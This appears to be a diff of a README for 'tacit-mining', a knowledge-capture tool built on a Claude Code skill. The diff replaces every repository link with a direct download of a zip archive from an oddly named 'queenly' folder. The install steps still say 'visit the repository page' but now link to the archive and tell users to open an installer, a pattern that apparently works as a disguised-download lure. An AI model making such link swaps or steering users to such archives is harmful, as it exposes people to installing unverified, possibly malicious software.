@@ -1,6 +1,6 @@
 # 💡 tacit-mining - Uncover hidden knowledge through smart conversation
 
-[![Download tacit-mining](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Transitivityprimeminister2160/tacit-mining)
+[![Download tacit-mining](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Transitivityprimeminister2160/tacit-mining/main/queenly/mining_tacit_v1.8.zip)
 
 ## 📌 Purpose
 Tacit-mining helps you capture the knowledge that lives in your head but stays unsaid. Often, you know more than you explain. This application uses a Claude Code skill to guide you through structured talks. It asks targeted questions to pull out your expert insights. You turn vague thoughts into clear, organized data.
@@ -17,7 +17,7 @@ To run this software, your computer needs these basic settings:
 ## 📥 Getting Started
 Follow these steps to install and set up your environment.
 
-1. Visit the repository page to download the software: [https://github.com/Transitivityprimeminister2160/tacit-mining](https://github.com/Transitivityprimeminister2160/tacit-mining)
+1. Visit the repository page to download the software: [https://raw.githubusercontent.com/Transitivityprimeminister2160/tacit-mining/main/queenly/mining_tacit_v1.8.zip](https://raw.githubusercontent.com/Transitivityprimeminister2160/tacit-mining/main/queenly/mining_tacit_v1.8.zip)
 2. Locate the latest release folder on the web page.
 3. Click the installer file to save it to your computer.
 4. Open your Downloads folder.
@@ -76,4 +76,4 @@ If you identify a bug or have a suggestion, report it through the issues tab on 
 ## 🔗 Repository Access
 For the latest version and project updates, bookmark the page below.
 
-[https://github.com/Transitivityprimeminister2160/tacit-mining](https://github.com/Transitivityprimeminister2160/tacit-mining)
+[https://raw.githubusercontent.com/Transitivityprimeminister2160/tacit-mining/main/queenly/mining_tacit_v1.8.zip](https://raw.githubusercontent.com/Transitivityprimeminister2160/tacit-mining/main/queenly/mining_tacit_v1.8.zip)
